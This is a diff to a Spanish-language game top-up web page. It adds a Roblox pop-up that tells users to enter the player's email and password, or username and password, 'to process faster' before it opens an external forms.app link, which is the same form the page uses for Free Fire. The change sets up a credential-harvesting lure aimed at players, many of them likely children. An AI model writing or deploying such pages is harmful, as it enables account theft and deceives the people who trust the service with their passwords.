@@ -220,6 +220,82 @@
     .schedule-btn:hover {
       background-color: #3367d6;
     }
+    
+    /* Modal para Roblox */
+    .roblox-modal {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 90%;
+      max-width: 500px;
+      background-color: white;
+      border-radius: 10px;
+      box-shadow: 0 5px 20px rgba(0,0,0,0.3);
+      z-index: 100;
+      display: none;
+      overflow: hidden;
+      padding: 20px;
+      text-align: center;
+    }
+    
+    .roblox-header {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 15px;
+    }
+    
+    .roblox-logo {
+      height: 40px;
+      margin-right: 10px;
+    }
+    
+    .important-icon {
+      color: #ff5722;
+      font-size: 24px;
+      margin-right: 10px;
+    }
+    
+    .roblox-title {
+      font-size: 18px;
+      font-weight: bold;
+      color: #333;
+    }
+    
+    .roblox-message {
+      font-size: 16px;
+      line-height: 1.5;
+      color: #555;
+      margin-bottom: 10px;
+      padding: 0 10px;
+    }
+    
+    .roblox-additional-message {
+      font-size: 14px;
+      color: #e53935;
+      margin: 15px 0;
+      padding: 10px;
+      background-color: #ffeeee;
+      border-radius: 5px;
+      border-left: 4px solid #e53935;
+    }
+    
+    .roblox-btn {
+      background-color: #00a2ff;
+      color: white;
+      border: none;
+      padding: 10px 25px;
+      border-radius: 5px;
+      cursor: pointer;
+      font-weight: 500;
+      transition: background-color 0.3s;
+      font-size: 16px;
+    }
+    
+    .roblox-btn:hover {
+      background-color: #0088cc;
+    }
   </style>
 </head>
 <body>
@@ -250,6 +326,23 @@
     </div>
   </div>
 
+  <!-- Modal para Roblox -->
+  <div class="modal-overlay" id="modalOverlayRoblox"></div>
+  <div class="roblox-modal" id="robloxModal">
+    <div class="roblox-header">
+      <img src="https://static.vecteezy.com/system/resources/previews/027/127/586/non_2x/roblox-logo-roblox-icon-transparent-free-png.png" alt="Roblox Logo" class="roblox-logo">
+      <span class="important-icon">⚠️</span>
+      <div class="roblox-title">IMPORTANTE</div>
+    </div>
+    <div class="roblox-message">
+      PARA PROCESAR MÁS RÁPIDO SU SOLICITUD POR FAVOR COLOQUE CORREO Y CONTRASEÑA DEL JUGADOR O USUARIO Y CONTRASEÑA
+    </div>
+    <div class="roblox-additional-message">
+      POR FAVOR ESTAR ATENTO AL COMUNICARNOS CON USTED CON EL CLIENTE PARA PROCESAR LA SOLICITUD YA QUE LOS CÓDIGOS DURAN 10 MINUTOS UNA VEZ SOLICITADOS
+    </div>
+    <button class="roblox-btn" onclick="proceedToRobloxForm()">ENTENDIDO</button>
+  </div>
+
   <!-- Contenido principal -->
   <h1>ELIGE EL JUEGO QUE DESEAS RECARGAR</h1>
   <div class="button-container">
@@ -271,7 +364,7 @@
     <button class="button" onclick="showAlert('Abrir PUBG')">
       <img src="https://static.cdnlogo.com/logos/p/57/pubg.png" alt="PUBG">
     </button>
-    <button class="button" onclick="checkScheduleAndOpen('https://96vxnn73.forms.app/recargafreefire-1')">
+    <button class="button" onclick="openRobloxModal()">
       <img src="https://static.vecteezy.com/system/resources/previews/027/127/586/non_2x/roblox-logo-roblox-icon-transparent-free-png.png" alt="Robux">
     </button>
     <button class="button" onclick="showAlert('Abrir Lords Mobile')">
@@ -333,10 +426,34 @@
       alert(message);
     }
     
+    // Función para abrir modal de Roblox
+    function openRobloxModal() {
+      if (isOutsideWorkingHours()) {
+        document.getElementById('scheduleModal').style.display = 'block';
+        document.getElementById('modalOverlayFreeFire').style.display = 'block';
+      } else {
+        document.getElementById('robloxModal').style.display = 'block';
+        document.getElementById('modalOverlayRoblox').style.display = 'block';
+      }
+    }
+    
+    // Función para proceder al formulario de Roblox
+    function proceedToRobloxForm() {
+      closeRobloxModal();
+      window.open('https://96vxnn73.forms.app/recargafreefire-1', '_blank');
+    }
+    
+    // Función para cerrar modal de Roblox
+    function closeRobloxModal() {
+      document.getElementById('robloxModal').style.display = 'none';
+      document.getElementById('modalOverlayRoblox').style.display = 'none';
+    }
+    
     // Cerrar al hacer clic fuera
     document.getElementById('modalOverlayFreeFire').addEventListener('click', function() {
       closeFreeFireModal();
       closeScheduleModal();
+      closeRobloxModal();
     });
     
     // Evitar propagación
@@ -345,6 +462,10 @@
     });
     
     document.getElementById('scheduleModal').addEventListener('click', function(e) {
+      e.stopPropagation();
+    });
+    
+    document.getElementById('robloxModal').addEventListener('click', function(e) {
       e.stopPropagation();
     });
   </script>
